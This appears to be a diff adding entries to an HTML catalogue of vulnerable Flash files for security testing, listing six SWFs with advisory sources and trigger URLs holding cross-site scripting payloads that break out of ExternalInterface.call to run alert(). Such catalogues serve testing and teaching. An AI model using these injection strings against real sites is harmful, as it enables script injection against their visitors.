@@ -27,6 +27,60 @@
 
     </br>
     <li>
+        player.swf : ExternalInterface.call()
+        <ul>
+            <li>source - Wordpress Audio Player XSS</li>
+            <li>trigger - <b>files/player.swf?playerID=a\%22%29%29}catch%28e%29{alert%28document.domain%29}//</b></li>
+        </ul>
+    </li>
+
+    </br>
+    <li>
+        uploader.swf : ExternalInterface.call()
+        <ul>
+            <li>source - YUI http://yuilibrary.com/support/20131111-vulnerability/</li>
+            <li>trigger - <b>files/uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert%28document.domain%29;}//</b></li>
+        </ul>
+    </li>
+
+    </br>
+    <li>
+        tagcloud.swf : ExternalInterface.call() href attribute xss
+        <ul>
+            <li>source - http://www.exploit-db.com/exploits/33566/</li>
+            <li>trigger - <b>files/tagcloud.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href='http://websecurity.com.ua'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E</b></li>
+        </ul>
+    </li>
+
+    </br>
+    <li>
+        xss.swf : ExternalInterface.call()
+        <ul>
+            <li>source - https://github.com/evilcos/xss.swf</li>
+            <li>trigger - <b>https://github.com/evilcos/xss.swf/blob/master/README.md</b></li>
+        </ul>
+    </li>
+
+    </br>
+    <li>
+        open-flash-chart.swf : get-data
+        <ul>
+            <li>source - http://packetstormsecurity.com/files/120433/WordPress-Pretty-Link-1.6.3-Cross-Site-Scripting.html</li>
+            <li>trigger - <b>files/open-flash-chart.swf?get-data=(function(){alert(/hello/)})()</b></li>
+        </ul>
+    </li>
+
+    </br>
+    <li>
+        io.swf : ExternalInterface.call
+        <ul>
+            <li>source - http://xforce.iss.net/xforce/xfdb/85817</li>
+            <li>trigger - <b>files/io.swf?yid=\"));}catch(e){alert(9)}//</b></li>
+        </ul>
+    </li>
+
+    </br>
+    <li>
         redirect.swf : geturl()
         <ul>
             <li>source - Google</li>
